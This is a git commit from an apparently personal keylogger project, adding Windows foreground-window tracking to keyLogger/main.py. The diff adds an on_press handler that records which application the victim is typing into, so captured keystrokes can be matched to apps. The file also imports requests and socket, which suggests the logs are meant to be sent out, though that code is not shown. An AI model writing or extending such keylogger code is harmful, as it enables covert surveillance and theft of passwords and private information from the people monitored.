e482559319808f4b382b328a6b6cb1726d806382
manishfsb <mnshbsnt@gmail.com>
2020-11-17 22:25:09 -0500

    Importing the win 32 GUI module that will get the window the user is on and help us determine the app we're using to better guess what might the log be relevant to

--- keyLogger/main.py
+++ keyLogger/main.py
@@ -3,6 +3,7 @@ import time
 import os
 import requests
 import socket
+import win32gui
 
 datetime = time.ctime(time.time())
 user = os.path.expanduser('~').split('\\')[2]
@@ -15,5 +16,22 @@ logged_data.append(msg)
 
 old_app = ''
 
+delete_file = []
 
+
+def on_press(key):
+    global old_app
+
+    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+    if new_app == 'Cortana':
+        new_app = 'Windows Start Menu'
+    else:
+        pass
+
+    if new_app != old_app and new_app != '':
+        logged_data.append(f'[{datetime}] ~ {new_app}\n')
+        old_app = new_app
+    else:
+        pass
 
